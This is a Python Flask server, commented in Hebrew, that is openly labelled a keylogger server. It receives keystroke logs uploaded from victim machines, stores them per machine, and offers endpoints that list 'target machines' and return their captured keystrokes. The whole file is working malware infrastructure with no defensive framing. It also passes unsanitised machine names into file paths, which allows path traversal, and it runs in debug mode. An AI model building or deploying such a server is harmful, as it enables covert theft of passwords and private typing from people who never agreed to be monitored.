from flask import Flask, request, jsonify
import os
import time

app = Flask(__name__)

# תיקיית הנתונים הראשית
DATA_FOLDER = "data"
os.makedirs(DATA_FOLDER, exist_ok=True)


def generate_log_filename():
    """מחזירה שם קובץ המבוסס על חותמת זמן"""
    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"


@app.route('/')
def home():
    return "KeyLogger Server is Running"


@app.route('/api/upload', methods=['POST'])
def upload():
    """API לקבלת נתוני Keylogger ושמירתם תחת תיקיית מכונה"""
    data = request.get_json()

    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    log_data = data["data"]

    # יצירת תיקייה עבור המחשב אם אינה קיימת
    machine_folder = os.path.join(DATA_FOLDER, machine)
    os.makedirs(machine_folder, exist_ok=True)

    # יצירת שם קובץ חדש ושמירת הנתונים
    filename = generate_log_filename()
    file_path = os.path.join(machine_folder, filename)

    with open(file_path, "w", encoding="utf-8") as f:
        f.write(log_data)

    return jsonify({"status": "success", "file": file_path}), 200


@app.route('/api/get_target_machines_list', methods=['GET'])
def list_machines():
    """API המחזיר רשימת מחשבים עליהם רץ הכלי"""
    machines = [d for d in os.listdir(DATA_FOLDER) if os.path.isdir(os.path.join(DATA_FOLDER, d))]
    return jsonify({"machines": machines})


@app.route('/api/get_target_machine_keystrokes', methods=['GET'])
def get_keystrokes():
    """API להחזרת נתוני הקשות ממחשב ספציפי"""
    machine = request.args.get("machine")

    if not machine:
        return jsonify({"error": "Machine name is required"}), 400

    machine_folder = os.path.join(DATA_FOLDER, machine)

    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine not found"}), 404

    logs = []
    for filename in sorted(os.listdir(machine_folder)):
        file_path = os.path.join(machine_folder, filename)
        with open(file_path, "r", encoding="utf-8") as f:
            logs.append({"file": filename, "content": f.read()})

    return jsonify({"machine": machine, "logs": logs})


if __name__ == '__main__':
    app.run(debug=True)
